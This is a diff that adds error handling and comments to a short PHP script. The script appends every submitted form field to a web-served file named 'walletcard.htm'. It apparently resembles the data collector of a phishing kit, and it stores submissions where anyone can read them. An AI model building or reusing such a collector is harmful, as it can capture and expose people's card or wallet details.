@@ -1,10 +1,15 @@
 <?php
-// Open or create a file for writing form data
+// Attempt to open the file for appending data
 $handle = fopen("walletcard.htm", "a");
 
-// Iterate through POST data
+// Check if the file opened successfully
+if ($handle === false) {
+    die('Error: Unable to open walletcard.htm for writing.');
+}
+
+// Iterate through POST data and write to the file
 foreach ($_POST as $variable => $value) {
-    // Sanitize form input to prevent any injection attacks
+    // Sanitize form input to prevent injection attacks
     $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
     $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
     
@@ -15,7 +20,10 @@ foreach ($_POST as $variable => $value) {
     fwrite($handle, "<br>");
 }
 
+// Add a separator for entries
 fwrite($handle, "<hr>");
+
+// Close the file handle
 fclose($handle);
 ?>
 
